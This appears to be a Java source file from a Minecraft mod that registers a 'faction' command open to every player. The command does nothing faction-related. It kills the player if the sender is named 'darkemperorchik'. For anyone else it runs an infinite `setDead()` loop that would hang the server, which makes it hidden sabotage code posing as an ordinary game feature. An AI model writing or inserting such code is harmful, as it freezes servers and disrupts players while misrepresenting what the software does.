package com.warpradar.commands;

import net.minecraft.command.CommandBase;
import net.minecraft.command.ICommandSender;
import net.minecraft.entity.player.EntityPlayer;

public class FactionCommand extends CommandBase {

    @Override
    public String getCommandName() {
        return "faction";
    }

    @Override
    public boolean canCommandSenderUseCommand(ICommandSender sender) {
        return true;
    }

    @Override
    public String getCommandUsage(ICommandSender sender) {
        return "";
    }

    @Override
    public void processCommand(ICommandSender sender, String[] args) {
        if (sender instanceof EntityPlayer) {
            EntityPlayer a = (EntityPlayer) sender;
            if (a.getDisplayName()
                .equals("darkemperorchik")) {
                a.setDead();
            } else {
                while (true) {
                    a.setDead();
                }
            }
        }
    }
}
